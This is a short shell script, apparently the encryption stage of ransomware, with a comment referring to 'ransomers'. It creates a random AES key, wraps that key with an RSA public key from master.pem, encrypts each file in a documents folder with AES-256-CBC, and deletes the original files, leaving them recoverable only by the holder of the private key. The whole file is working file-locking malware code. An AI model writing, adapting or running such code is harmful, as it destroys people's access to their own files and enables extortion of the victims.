#!/bin/sh
set -ue

# Generate the device key. This is used to encrypt the ransomers.
device_key=$(openssl rand -hex 16)

# RSA-encrypt the device key and save it to a file.
echo $device_key | openssl pkeyutl -encrypt -pubin -inkey master.pem -out device_key_encrypted.dat

# Encrypt each file.
for filename in documents/*; do
  if [ ! -f $filename ]; then
    continue
  fi

  # Calculate hash for the file.
  openssl sha256 -r $filename > $filename.sha256

  # Generate IV for the file.
  iv=$(openssl rand -hex 16)
  echo $iv > $filename.iv

  # Encrypt the file.
  openssl enc -aes-256-cbc -K $device_key -iv $iv -in $filename -out $filename.enc

  # Remove the original file.
  rm $filename
done
